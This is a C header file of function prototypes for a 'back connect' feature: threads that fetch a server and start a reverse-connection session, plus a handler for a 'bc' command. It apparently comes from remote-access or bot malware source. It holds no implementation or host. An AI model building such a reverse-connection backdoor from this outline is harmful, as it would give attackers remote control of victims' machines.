
#ifndef BackConnectH
#define BackConnectH
//----------------------------------------------------------------------------


DWORD WINAPI BackConnectThread( LPVOID lpData );
DWORD WINAPI GetServerForBackConnect( LPVOID lpData );

const PCHAR CommandBackConnect = "bc\0";

bool ExecuteBackConnectCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments);

DWORD WINAPI StartBCSessionWork( LPVOID lpData );

//----------------------------------------------------------------------------
#endif